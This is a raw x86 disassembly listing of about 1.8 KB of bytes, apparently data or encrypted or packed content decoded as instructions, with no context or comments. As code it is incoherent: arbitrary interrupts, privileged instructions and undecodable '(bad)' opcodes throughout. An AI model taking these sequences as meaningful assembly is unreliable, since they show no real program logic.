  425a01:	std    
  425a02:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a08:	popf   
  425a09:	shl    ebp,cl
  425a0b:	sub    BYTE PTR [ebx-0x2b],dl
  425a0e:	xchg   DWORD PTR [ebx],edx
  425a10:	or     cl,bh
  425a12:	nop
  425a13:	add    BYTE PTR [eax],al
  425a15:	add    ch,cl
  425a17:	lea    edi,[ebp+0x3bbd96cd]
  425a1d:	icebp  
  425a1e:	cmp    ecx,DWORD PTR [edi]
  425a20:	shr    edx,cl
  425a22:	sub    bl,dl
  425a24:	jmp    0x4259b8
  425a26:	push   ebx
  425a27:	adc    ecx,ebp
  425a29:	xchg   esi,eax
  425a2a:	mov    ebp,0x3bbda6cd
  425a2f:	cdq    
  425a30:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425a36:	in     eax,0x28
  425a38:	push   ebx
  425a39:	aad    0xa
  425a3b:	int3   
  425a3c:	pop    ss
  425a3d:	aam    0x0
  425a3f:	add    BYTE PTR [eax],al
  425a41:	int    0x8d
  425a43:	dec    esp
  425a44:	int    0x89
  425a46:	int    0x96
  425a48:	std    
  425a49:	int    0xa6
  425a4b:	std    
  425a4c:	int    0x7e
  425a4e:	jo     0x425a8b
  425a50:	popf   
  425a51:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425a57:	in     eax,0x28
  425a59:	push   ebx
  425a5a:	aad    0xa
  425a5c:	int3   
  425a5d:	pop    ss
  425a5e:	aam    0x0
  425a60:	add    BYTE PTR [eax],al
  425a62:	int    0x8d
  425a64:	xor    ch,cl
  425a66:	xchg   esi,eax
  425a67:	xor    BYTE PTR [ebx],bh
  425a69:	icebp  
  425a6a:	cmp    ecx,DWORD PTR [edi]
  425a6c:	shr    edx,cl
  425a6e:	sub    bl,dl
  425a70:	jmp    0x425a04
  425a72:	push   ebx
  425a73:	adc    ecx,ebp
  425a75:	xchg   esi,eax
  425a76:	std    
  425a77:	int    0xa6
  425a79:	std    
  425a7a:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425a80:	cdq    
  425a81:	shl    ebx,cl
  425a83:	xchg   edx,eax
  425a84:	shl    ebp,cl
  425a86:	sub    BYTE PTR [ebx-0x2b],dl
  425a89:	int    0xa6
  425a8b:	std    
  425a8c:	cmp    edi,DWORD PTR [ecx-0x2d]
  425a8f:	mov    ebp,0xfff40492
  425a94:	shl    ebp,cl
  425a96:	sub    BYTE PTR [ebx-0x3b],dl
  425a99:	xchg   ecx,esi
  425a9b:	int    0x76
  425a9d:	adc    al,0xa
  425a9f:	int3   
  425aa0:	pop    ss
  425aa1:	aam    0x0
  425aa3:	add    BYTE PTR [eax],al
  425aa5:	int    0x8d
  425aa7:	adc    al,0x4
  425aa9:	add    bh,bh
  425aab:	shl    edx,cl
  425aad:	sub    BYTE PTR [ebx],bh
  425aaf:	jns    0x425a84
  425ab1:	mov    ebp,0xcdd35392
  425ab6:	(bad)  
  425ab7:	std    
  425ab8:	int    0x96
  425aba:	std    
  425abb:	add    al,0xfb
  425abd:	(bad)  
  425abe:	cmp    ecx,DWORD PTR [edi]
  425ac0:	shr    edx,cl
  425ac2:	sub    bl,dl
  425ac4:	jmp    0x425a58
  425ac6:	push   ebx
  425ac7:	adc    ecx,ebp
  425ac9:	xchg   esi,eax
  425aca:	std    
  425acb:	int    0xa6
  425acd:	std    
  425ace:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425ad4:	repz xchg edx,eax
  425ad6:	shl    ebp,cl
  425ad8:	sub    BYTE PTR [ebx-0x2b],dl
  425adb:	xchg   DWORD PTR [ebx],edx
  425add:	int    0x96
  425adf:	std    
  425ae0:	int    0xa6
  425ae2:	std    
  425ae3:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425ae9:	in     eax,0x28
  425aeb:	shl    ebx,cl
  425aed:	xchg   edx,eax
  425aee:	push   ebx
  425aef:	aad    0x87
  425af1:	adc    ecx,DWORD PTR [edx]
  425af3:	add    eax,0xd4cf
  425af8:	add    bh,cl
  425afa:	push   es
  425afb:	nop
  425afc:	add    BYTE PTR [eax],al
  425afe:	add    BYTE PTR [eax-0x33],dh
  425b01:	jbe    0x425b00
  425b03:	int    0x8d
  425b05:	std    
  425b06:	sar    bh,0x63
  425b09:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b0c:	or     al,0xd3
  425b0e:	mov    ebp,0x28f2d392
  425b13:	push   ebx
  425b14:	shl    DWORD PTR [eax-0x33],cl
  425b17:	jbe    0x425b45
  425b19:	iret   
  425b1a:	or     DWORD PTR [ecx-0x80],eax
  425b1d:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425b24:	add    BYTE PTR [eax-0x69ffb000],0x24
  425b2b:	int    0x8d
  425b2d:	push   esp
  425b2e:	or     al,BYTE PTR [ecx-0x32528933]
  425b34:	lea    esi,[ebp-0x6d82bad1]
  425b3a:	shr    ebx,cl
  425b3c:	xchg   edx,eax
  425b3d:	int    0x8d
  425b3f:	lods   eax,DWORD PTR ds:[esi]
  425b40:	int    0x96
  425b42:	mov    ch,0x3b
  425b44:	leave  
  425b45:	cmp    ebx,edx
  425b47:	push   ebx
  425b48:	icebp  
  425b49:	bound  eax,QWORD PTR [eax]
  425b4b:	(bad)  
  425b4c:	xor    al,0xd3
  425b4e:	repnz sub BYTE PTR [eax],al
  425b51:	(bad)  
  425b52:	inc    esp
  425b53:	mov    ebp,0xfb94
  425b58:	int    0x76
  425b5a:	lods   eax,DWORD PTR ds:[esi]
  425b5b:	int    0x8d
  425b5d:	mov    ch,0x2f
  425b5f:	inc    ebp
  425b60:	jge    0x425af4
  425b62:	shr    ebx,cl
  425b64:	xchg   edx,eax
  425b65:	int    0x8d
  425b67:	lods   eax,DWORD PTR ds:[esi]
  425b68:	int    0x96
  425b6a:	mov    ch,0x3b
  425b6c:	leave  
  425b6d:	cmp    ebx,edx
  425b6f:	push   ebx
  425b70:	icebp  
  425b71:	bound  eax,QWORD PTR [eax]
  425b73:	(bad)  
  425b74:	push   esp
  425b75:	shl    edx,cl
  425b77:	sub    BYTE PTR [eax],al
  425b79:	(bad)  
  425b7a:	cmp    al,0xbd
  425b7c:	inc    esp
  425b7d:	sti    
  425b7e:	add    BYTE PTR [eax],al
  425b80:	int    0x76
  425b82:	std    
  425b83:	int    0x8d
  425b85:	std    
  425b86:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425b89:	repnz sub BYTE PTR [ebx],bh
  425b8c:	jns    0x425b61
  425b8e:	mov    ebp,0xcdd35392
  425b93:	(bad)  
  425b94:	std    
  425b95:	int    0x96
  425b97:	std    
  425b98:	cmp    ecx,DWORD PTR [edi]
  425b9a:	shr    ebx,cl
  425b9c:	xchg   edx,eax
  425b9d:	cmp    edx,ebp
  425b9f:	shr    edx,cl
  425ba1:	sub    BYTE PTR [ebx+0x13],dl
  425ba4:	xchg   ebx,edx
  425ba6:	int    0x8d
  425ba8:	std    
  425ba9:	int    0x96
  425bab:	std    
  425bac:	cmp    ecx,DWORD PTR [edi]
  425bae:	shr    ebx,cl
  425bb0:	xchg   edx,eax
  425bb1:	cmp    edx,ebp
  425bb3:	shr    edx,cl
  425bb5:	sub    BYTE PTR [ebx+0x13],dl
  425bb8:	xchg   ebx,edx
  425bba:	int    0x8d
  425bbc:	std    
  425bbd:	int    0x96
  425bbf:	std    
  425bc0:	cmp    ecx,DWORD PTR [edi]
  425bc2:	shr    ebx,cl
  425bc4:	xchg   edx,eax
  425bc5:	cmp    edx,ebp
  425bc7:	shr    edx,cl
  425bc9:	sub    BYTE PTR [ebx+0x13],dl
  425bcc:	xchg   ebx,edx
  425bce:	or     al,BYTE PTR [esi]
  425bd0:	nop
  425bd1:	add    BYTE PTR [eax],al
  425bd3:	add    ch,cl
  425bd5:	jbe    0x425c2b
  425bd7:	int    0x80
  425bd9:	int    0x8d
  425bdb:	mov    ebp,0x3bbd96cd
  425be0:	(bad)  
  425be2:	aad    0xd3
  425be4:	jmp    0x425b78
  425be6:	shr    edx,cl
  425be8:	sub    BYTE PTR [ebx+0x13],dl
  425beb:	or     al,BYTE PTR ds:0xd4cf
  425bf1:	add    ch,cl
  425bf3:	jbe    0x425c41
  425bf5:	int    0x80
  425bf7:	int    0x8d
  425bf9:	std    
  425bfa:	int    0x96
  425bfc:	std    
  425bfd:	cmp    ecx,DWORD PTR [edi]
  425bff:	shr    ebx,cl
  425c01:	xchg   edx,eax
  425c02:	int    0x6c
  425c04:	jo     0x425c41
  425c06:	aad    0xd3
  425c08:	jmp    0xcf05:0xa135328
  425c0f:	aam    0x0
  425c11:	add    BYTE PTR [eax],al
  425c13:	int    0x76
  425c15:	sbb    al,0xcd
  425c17:	lea    ebx,[ebx+edi*1]
  425c1a:	or     al,0xd3
  425c1c:	repnz sub BYTE PTR [ebx],bh
  425c1f:	jns    0x425bf4
  425c21:	mov    ebp,0xcdd35392
  425c26:	(bad)  
  425c27:	std    
  425c28:	int    0x96
  425c2a:	std    
  425c2b:	cmp    edx,ebp
  425c2d:	cmp    ecx,DWORD PTR [edi]
  425c2f:	shr    edx,cl
  425c31:	sub    bl,dl
  425c33:	jmp    0x425bc7
  425c35:	push   ebx
  425c36:	adc    ecx,ebp
  425c38:	xchg   esi,eax
  425c39:	std    
  425c3a:	int    0xa6
  425c3c:	std    
  425c3d:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425c43:	hlt    
  425c44:	call   ebx
  425c46:	in     eax,0x28
  425c48:	push   ebx
  425c49:	aad    0x87
  425c4b:	adc    ecx,DWORD PTR [edx]
  425c4d:	add    eax,0xd4cf
  425c52:	add    ch,cl
  425c54:	jbe    0x425c53
  425c56:	int    0x8d
  425c58:	std    
  425c59:	add    al,0x2
  425c5b:	call   ebx
  425c5d:	repnz sub BYTE PTR [ebx],bh
  425c60:	jns    0x425c35
  425c62:	mov    ebp,0xcdd35392
  425c67:	(bad)  
  425c68:	std    
  425c69:	int    0x96
  425c6b:	std    
  425c6c:	add    al,0xfb
  425c6e:	(bad)  
  425c6f:	cmp    ecx,DWORD PTR [edi]
  425c71:	shr    edx,cl
  425c73:	sub    bl,dl
  425c75:	jmp    0x425c09
  425c77:	push   ebx
  425c78:	adc    eax,DWORD PTR [edi-0x272322d]
  425c7e:	int    0x96
  425c80:	std    
  425c81:	add    al,0xfb
  425c83:	(bad)  
  425c84:	cmp    ecx,DWORD PTR [edi]
  425c86:	shr    edx,cl
  425c88:	sub    bl,dl
  425c8a:	jmp    0x425c1e
  425c8c:	push   ebx
  425c8d:	adc    ecx,edi
  425c8f:	pop    ss
  425c90:	nop
  425c91:	add    BYTE PTR [eax],al
  425c93:	add    BYTE PTR [edx-0x33],ah
  425c96:	xchg   esi,eax
  425c97:	std    
  425c98:	int    0xa6
  425c9a:	std    
  425c9b:	xchg   ebx,edx
  425c9d:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425ca3:	int3   
  425ca4:	push   es
  425ca5:	aam    0x0
  425ca7:	add    BYTE PTR [eax],al
  425ca9:	int    0x76
  425cab:	sub    al,0x4
  425cad:	hlt    
  425cae:	call   ebx
  425cb0:	repz xchg edx,eax
  425cb2:	shl    ebp,cl
  425cb4:	sub    BYTE PTR [ebx-0x2b],dl
  425cb7:	iret   
  425cb8:	or     edi,ebp
  425cba:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425cc1:	add    BYTE PTR [eax+0x50007162],0x0
  425cc8:	xchg   esi,eax
  425cc9:	and    al,0x6
  425ccb:	ins    DWORD PTR es:[edi],dx
  425ccc:	aam    0xbc
  425cce:	int    0x76
  425cd0:	in     eax,dx
  425cd1:	int    0x8d
  425cd3:	adc    DWORD PTR [edi],ebp
  425cd5:	inc    ebp
  425cd6:	jge    0x425c6a
  425cd8:	shr    ebx,cl
  425cda:	xchg   edx,eax
  425cdb:	int    0xe3
  425cdd:	int    0x7d
  425cdf:	int    0x76
  425ce1:	in     eax,dx
  425ce2:	int    0x96
  425ce4:	adc    DWORD PTR [ebx],edi
  425ce6:	fidivr DWORD PTR [ebx]
  425ce8:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425cef:	push   ebx
  425cf0:	adc    ecx,ebp
  425cf2:	xor    BYTE PTR [ebx-0x76],al
  425cf5:	jo     0x425cc4
  425cf7:	xchg   esi,eax
  425cf8:	push   esp
  425cf9:	in     al,dx
  425cfa:	push   esp
  425cfb:	int    0x92
  425cfd:	int    0xa6
  425cff:	push   eax
  425d00:	retf   0x5324
  425d03:	or     DWORD PTR [eax+ecx*4],esp
  425d06:	int    0x76
  425d08:	cmc    
  425d09:	int    0x8d
  425d0b:	stc    
  425d0c:	das    
  425d0d:	inc    ebp
  425d0e:	jge    0x425ca2
  425d10:	shr    ebx,cl
  425d12:	xchg   edx,eax
  425d13:	int    0x8d
  425d15:	cmc    
  425d16:	int    0xa6
  425d18:	stc    
  425d19:	cmp    ecx,ecx
  425d1b:	cmp    ebx,ebp
  425d1d:	shl    edx,cl
  425d1f:	sub    ch,cl
  425d21:	lea    esi,[eax]
  425d23:	push   ebx
  425d24:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425d2a:	int    0x1c
  425d2c:	inc    ebx
  425d2d:	(bad)  
  425d2e:	jo     0x425d3a
  425d30:	lea    esi,[eax]
  425d32:	or     cl,0xec
  425d35:	xchg   ch,cl
  425d37:	xchg   esi,eax
  425d38:	push   esp
  425d39:	int    0x76
  425d3b:	dec    esp
  425d3c:	int    0x4a
  425d3e:	int    0x20
  425d40:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425d46:	sbb    al,0xcd
  425d48:	dec    edx
  425d49:	xchg   ebp,ecx
  425d4b:	sub    eax,0xa808080
  425d50:	lea    esi,[eax]
  425d52:	int    0x4a
  425d54:	int    0xa6
  425d56:	push   eax
  425d57:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425d5e:	int    0x80
  425d60:	int    0x4a
  425d62:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425d66:	jbe    0x425d55
  425d68:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425d6e:	das    
  425d6f:	inc    ebp
  425d70:	jge    0x425d04
  425d72:	shr    ebx,cl
  425d74:	xchg   edx,eax
  425d75:	int    0x8d
  425d77:	in     eax,dx
  425d78:	int    0xa6
  425d7a:	adc    DWORD PTR [ebx],edi
  425d7c:	leave  
  425d7d:	cmp    ebx,ebp
  425d7f:	shl    edx,cl
  425d81:	sub    BYTE PTR [ebx-0x3b],dl
  425d84:	or     dh,BYTE PTR [esi+0x44]
  425d87:	int    0x76
  425d89:	xor    bl,ch
  425d8b:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425d91:	in     eax,dx
  425d92:	int    0x8d
  425d94:	adc    DWORD PTR [edi],ebp
  425d96:	inc    ebp
  425d97:	jge    0x425d2b
  425d99:	shr    ebx,cl
  425d9b:	xchg   edx,eax
  425d9c:	int    0x8d
  425d9e:	in     eax,dx
  425d9f:	int    0xa6
  425da1:	adc    ebx,edx
  425da3:	repnz sub ch,cl
  425da6:	lea    edx,[ebx+edi*1]
  425da9:	leave  
  425daa:	cmp    ebx,ebp
  425dac:	add    al,0xd3
  425dae:	stc    
  425daf:	push   ebx
  425db0:	(bad)
  425db3:	inc    ebx
  425db4:	shr    DWORD PTR [edi],cl
  425db6:	add    al,0xf7
  425db8:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425dc0:	dec    ebx
  425dc1:	mov    BYTE PTR [ebx],dh
  425dc3:	jge    0x425dcf
  425dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425dc6:	xor    al,0xa
  425dc8:	lea    edi,[ecx*8+0x76cdf18d]
  425dcf:	xchg   ebp,eax
  425dd0:	das    
  425dd1:	inc    ebp
  425dd2:	rcl    DWORD PTR [edx-0x326d422d],cl
  425dd8:	jbe    0x425dcb
  425dda:	int    0xa6
  425ddc:	xchg   ebp,eax
  425ddd:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425de3:	cmp    esi,eax
  425de5:	cmp    ebx,ebp
  425de7:	push   ebx
  425de8:	or     al,0xcd
  425dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425deb:	stc    
  425dec:	das    
  425ded:	inc    ebp
  425dee:	popf   
  425def:	xchg   edx,eax
  425df0:	or     dh,BYTE PTR [esi+0x54]
  425df3:	int    0x76
  425df5:	cmc    
  425df6:	push   ecx
  425df7:	out    0x54,al
  425df9:	add    al,0xd3
  425dfb:	dec    edx
  425dfc:	shr    esp,cl
  425dfe:	xchg   edx,eax
  425dff:	int    0xa6
  425e01:	stc    
  425e02:	cmp    ebx,ebp
  425e04:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e0a:	int    0xa6
  425e0c:	cmc    
  425e0d:	int    0x8d
  425e0f:	stc    
  425e10:	das    
  425e11:	inc    ebp
  425e12:	or     al,0x92
  425e14:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e1a:	shr    ebx,cl
  425e1c:	xchg   edx,eax
  425e1d:	int    0x8d
  425e1f:	stc    
  425e20:	cmp    ecx,ebx
  425e22:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425e28:	cmp    esp,ecx
  425e2a:	push   ebx
  425e2b:	fcmovne st,st(5)
  425e2d:	lea    esi,[edi+ebp*1]
  425e30:	mov    ebx,0x2bc53389
  425e35:	ror    ebp,cl
  425e37:	(bad)  
  425e38:	icebp  
  425e39:	or     dh,BYTE PTR [esi+0x54]
  425e3c:	int    0x76
  425e3e:	xchg   ebp,eax
  425e3f:	das    
  425e40:	inc    ebp
  425e41:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e47:	jbe    0x425e3a
  425e49:	int    0xa6
  425e4b:	xchg   ebp,eax
  425e4c:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425e52:	das    
  425e53:	mov    ebx,0xa6020180
  425e58:	cmp    ebx,ebp
  425e5a:	dec    edx
  425e5b:	or     al,0x1
  425e5d:	ror    DWORD PTR [edx-0x2b],cl
  425e60:	mov    ebp,0xbdbfcb3b
  425e65:	or     ah,BYTE PTR [ebx]
  425e67:	and    eax,0x92d3352f
  425e6c:	shr    DWORD PTR [ebp+0x37d65692],cl
  425e72:	ficom  WORD PTR [ebx]
  425e74:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425e77:	fidiv  WORD PTR [edi]
  425e79:	ficom  WORD PTR [ebx]
  425e7b:	(bad)  
  425e7c:	ss inc ebx
  425e7e:	or     al,0xd6
  425e80:	cs int 0x92
  425e83:	int    0x8d
  425e85:	xor    BYTE PTR [edi+0x548dcd81],al
  425e8b:	add    al,0x64
  425e8d:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425e93:	int    0x8d
  425e95:	xor    BYTE PTR [edi-0x7772327f],al
  425e9b:	xchg   DWORD PTR [esi+0x54],esi
  425e9e:	int    0x89
  425ea0:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425eaa:	push   es
  425eab:	and    eax,DWORD PTR [eax]
  425ead:	add    BYTE PTR [eax],al
  425eaf:	in     al,dx
  425eb0:	test   DWORD PTR [edi+0x25230abd],edi
  425eb6:	int    0x76
  425eb8:	adc    al,0x81
  425eba:	jbe    0x425f00
  425ebc:	leave  
  425ebd:	jbe    0x425f2c
  425ebf:	scas   al,BYTE PTR es:[edi]
  425ec0:	aaa    
  425ec1:	ficom  WORD PTR [ebx]
  425ec3:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425ec9:	int    0x8d
  425ecb:	jne    0x425efc
  425ecd:	inc    ebp
  425ece:	jge    0x425e62
  425ed0:	shr    ebx,cl
  425ed2:	xchg   edx,eax
  425ed3:	int    0x8d
  425ed5:	ins    DWORD PTR es:[edi],dx
  425ed6:	int    0xa6
  425ed8:	jne    0x425ead
  425eda:	repnz sub ch,cl
  425edd:	lea    ecx,[ebp+ecx*8-0x77]
  425ee1:	cmp    ecx,ecx
  425ee3:	cmp    ebx,ebp
  425ee5:	push   ebx
  425ee6:	(bad)
  425ee9:	shl    esp,cl
  425eeb:	int    0x8d
  425eed:	inc    esp
  425eee:	inc    ebx
  425eef:	mov    BYTE PTR [edi+0x54],dh
  425ef2:	int    0x76
  425ef4:	xor    BYTE PTR [edi+0x760a1476],al
  425efa:	xor    ch,cl
  425efc:	ins    BYTE PTR es:[edi],dx
  425efd:	test   BYTE PTR [edx],cl
  425eff:	jbe    0x425f15
  425f01:	int    0x76
  425f03:	in     eax,dx
  425f04:	int    0x8d
  425f06:	adc    DWORD PTR [edi],ebp
  425f08:	inc    ebp
  425f09:	jge    0x425e9d
  425f0b:	shr    ebx,cl
  425f0d:	xchg   edx,eax
  425f0e:	int    0x8d
  425f10:	in     eax,dx
  425f11:	int    0xa6
  425f13:	adc    DWORD PTR [ebx],edi
  425f15:	fnstsw WORD PTR [ebx]
  425f17:	leave  
  425f18:	push   ebx
  425f19:	(bad)
  425f1c:	sub    BYTE PTR [esi+0x76],bl
  425f1f:	adc    al,0x2f
  425f21:	push   es
  425f22:	mov    esi,0xcd0000ff
  425f27:	(bad)  
  425f28:	std    
  425f29:	int    0x96
  425f2b:	std    
  425f2c:	cmp    ecx,DWORD PTR [edi]
  425f2e:	shr    ebx,cl
  425f30:	xchg   edx,eax
  425f31:	sar    bh,0x9c
  425f34:	cmp    esi,ecx
  425f36:	shr    edx,cl
  425f38:	sub    BYTE PTR [ebx+0x13],dl
  425f3b:	int    0x96
  425f3d:	std    
  425f3e:	int    0xa6
  425f40:	std    
  425f41:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f47:	popf   
  425f48:	shl    ebp,cl
  425f4a:	sub    BYTE PTR [ebx-0x2b],dl
  425f4d:	xchg   DWORD PTR [ebx],edx
  425f4f:	int    0x96
  425f51:	std    
  425f52:	int    0xa6
  425f54:	std    
  425f55:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f5b:	popf   
  425f5c:	shl    ebp,cl
  425f5e:	sub    BYTE PTR [ebx-0x2b],dl
  425f61:	xchg   DWORD PTR [ebx],edx
  425f63:	int    0x96
  425f65:	std    
  425f66:	int    0xa6
  425f68:	std    
  425f69:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425f6f:	xchg   edx,eax
  425f70:	shl    ebp,cl
  425f72:	sub    BYTE PTR [ebx-0x2b],dl
  425f75:	xchg   DWORD PTR [ebx],edx
  425f77:	or     cl,bh
  425f79:	nop
  425f7a:	add    BYTE PTR [eax],al
  425f7c:	add    ch,cl
  425f7e:	lea    edx,[eax-0x33]
  425f81:	xchg   esi,eax
  425f82:	mov    ebp,0x3bbda6cd
  425f87:	cdq    
  425f88:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425f8e:	in     eax,0x28
  425f90:	push   ebx
  425f91:	aad    0xa
  425f93:	int3   
  425f94:	pop    ss
  425f95:	aam    0x0
  425f97:	add    BYTE PTR [eax],al
  425f99:	int    0x8d
  425f9b:	dec    esp
  425f9c:	int    0x89
  425f9e:	int    0x96
  425fa0:	std    
  425fa1:	int    0xa6
  425fa3:	std    
  425fa4:	int    0x7e
  425fa6:	jo     0x425fe3
  425fa8:	cdq    
  425fa9:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425faf:	in     eax,0x28
  425fb1:	push   ebx
  425fb2:	aad    0xa
  425fb4:	int3   
  425fb5:	pop    ss
  425fb6:	aam    0x0
  425fb8:	add    BYTE PTR [eax],al
  425fba:	int    0x8d
  425fbc:	sbb    al,0xcd
  425fbe:	xchg   esi,eax
  425fbf:	sbb    al,0x3b
  425fc1:	icebp  
  425fc2:	shr    edx,cl
  425fc4:	sub    BYTE PTR [ebx],bh
  425fc6:	psrlq  mm5,mm3
  425fc9:	xchg   edx,eax
  425fca:	push   ebx
  425fcb:	adc    ecx,ebp
  425fcd:	xchg   esi,eax
  425fce:	std    
  425fcf:	int    0xa6
  425fd1:	std    
  425fd2:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425fd8:	cdq    
  425fd9:	shl    ebp,cl
  425fdb:	sub    bl,dl
  425fdd:	repz xchg edx,eax
  425fdf:	push   ebx
  425fe0:	aad    0xcd
  425fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fe3:	std    
  425fe4:	cmp    edi,DWORD PTR [ecx+0x4]
  425fe7:	hlt    
  425fe8:	call   ebx
  425fea:	mov    ebp,0x28e5d392
  425fef:	push   ebx
  425ff0:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  425ff6:	aam    0x0
  425ff8:	add    BYTE PTR [eax],al
  425ffa:	int    0x8d
  425ffc:	std    
  425ffd:	int    0x96
  425fff:	std    
  426000:	cmp    ecx,DWORD PTR [edi]
  426002:	shr    ebx,cl
  426004:	xchg   edx,eax
  426005:	sar    bh,0x9c
  426008:	cmp    esi,ecx
  42600a:	shr    edx,cl
  42600c:	sub    BYTE PTR [ebx+0x13],dl
  42600f:	int    0x96
  426011:	std    
  426012:	int    0xa6
  426014:	std    
  426015:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42601b:	popf   
  42601c:	shl    ebp,cl
  42601e:	sub    BYTE PTR [ebx-0x2b],dl
  426021:	xchg   DWORD PTR [ebx],edx
  426023:	int    0x96
  426025:	std    
  426026:	int    0xa6
  426028:	std    
  426029:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42602f:	popf   
  426030:	shl    ebp,cl
  426032:	sub    BYTE PTR [ebx-0x2b],dl
  426035:	xchg   DWORD PTR [ebx],edx
  426037:	iret   
  426038:	xchg   esi,eax
  426039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42603a:	or     dl,BYTE PTR ds:0xd4cf
  426040:	add    bh,cl
  426042:	iret   
  426043:	nop
  426044:	add    BYTE PTR [eax],al
  426046:	add    BYTE PTR [ecx-0x33],dh
  426049:	(bad)  
  42604a:	std    
  42604b:	int    0x96
  42604d:	std    
  42604e:	cmp    ecx,DWORD PTR [edi]
  426050:	int    0xd6
  426052:	sub    al,0x3b
  426054:	icebp  
  426055:	shr    ebx,cl
  426057:	xchg   edx,eax
  426058:	shr    edx,cl
  42605a:	sub    BYTE PTR [ebx+0x13],dl
  42605d:	jno    0x42602e
  42605f:	pop    es
  426060:	out    dx,eax
  426061:	add    BYTE PTR [eax+0x7cd7080],0x3d
  426068:	add    DWORD PTR [eax+0x500080],0x7cd2496
  426072:	add    DWORD PTR [ecx+0x760a8080],eax
  426078:	dec    esp
  426079:	int    0x76
  42607b:	mov    ch,cl
  42607d:	mov    BYTE PTR [edi-0x72f5b373],al
  426083:	dec    esp
  426084:	int    0x8d
  426086:	cmc    
  426087:	int    0x96
  426089:	stc    
  42608a:	das    
  42608b:	inc    ebp
  42608c:	jecxz  0x426020
  42608e:	shl    ebx,cl
  426090:	xchg   edx,eax
  426091:	int    0x96
  426093:	cmc    
  426094:	int    0xd6
  426096:	stc    
  426097:	cmp    esi,edi
  426099:	shr    edx,cl
  42609b:	sub    ch,cl
  42609d:	xchg   esi,eax
  42609e:	cmc    
  42609f:	cmp    esi,eax
  4260a1:	push   ebx
  4260a2:	bswap  ebp
  4260a4:	(bad)  
  4260a5:	stc    
  4260a6:	das    
  4260a7:	inc    ebp
  4260a8:	sti    
  4260a9:	xchg   edx,eax
  4260aa:	shr    edi,cl
  4260ac:	xchg   edx,eax
  4260ad:	int    0xd6
  4260af:	cmc    
  4260b0:	int    0xa6
  4260b2:	stc    
  4260b3:	cmp    ebx,ecx
  4260b5:	cmp    ebx,ebp
  4260b7:	push   ebx
  4260b8:	aad    0x87
  4260ba:	adc    ecx,ebp
  4260bc:	xchg   esi,eax
  4260bd:	cmc    
  4260be:	sar    DWORD PTR [ecx-0x62932d8],cl
  4260c4:	das    
  4260c5:	inc    ebp
  4260c6:	sti    
  4260c7:	xchg   edx,eax
  4260c8:	shr    edi,cl
  4260ca:	xchg   edx,eax
  4260cb:	int    0xd6
  4260cd:	cmc    
  4260ce:	int    0xa6
  4260d0:	stc    
  4260d1:	cmp    ebx,ecx
  4260d3:	cmp    ebx,ebp
  4260d5:	push   ebx
  4260d6:	aad    0x87
  4260d8:	adc    ecx,ebp
  4260da:	xchg   esi,eax
  4260db:	cmc    
  4260dc:	sar    DWORD PTR [ecx-0x62932d8],cl
  4260e2:	das    
  4260e3:	inc    ebp
  4260e4:	sti    
  4260e5:	xchg   edx,eax
  4260e6:	shr    edi,cl
  4260e8:	xchg   edx,eax
  4260e9:	int    0xd6
  4260eb:	cmc    
  4260ec:	cmp    ebx,ecx
  4260ee:	int    0xe6
  4260f0:	stc    
  4260f1:	cmp    eax,DWORD PTR [eax]
  4260f3:	push   ebx
  4260f4:	fld    DWORD PTR [edi+0x707113]
  4260fa:	(bad)  
  4260fb:	dec    esp
  4260fc:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426102:	add    BYTE PTR [eax],al
  426104:	int    0x76
  426106:	or     eax,0xcb63a8aa
  42610b:	rcl    BYTE PTR [eax-0x80],cl
  42610e:	xchg   esi,eax
  42610f:	int    0xed
  426111:	add    al,0xed
  426113:	inc    esp
  426114:	pop    ebx
  426115:	cwde   
  426116:	call   0x76c9:0xcb3bdd3b
  42611d:	popf   
  42611e:	(bad)  
  42611f:	aaa    
  426120:	ficom  WORD PTR [ebx]
  426122:	pop    ebp
  426123:	mov    ebp,0xa25230a
  426128:	jbe    0x4260cf
  42612a:	leave  
  42612b:	jbe    0x4260ea
  42612d:	xchg   ecx,eax
  42612e:	aaa    
  42612f:	ficom  WORD PTR [ebx]
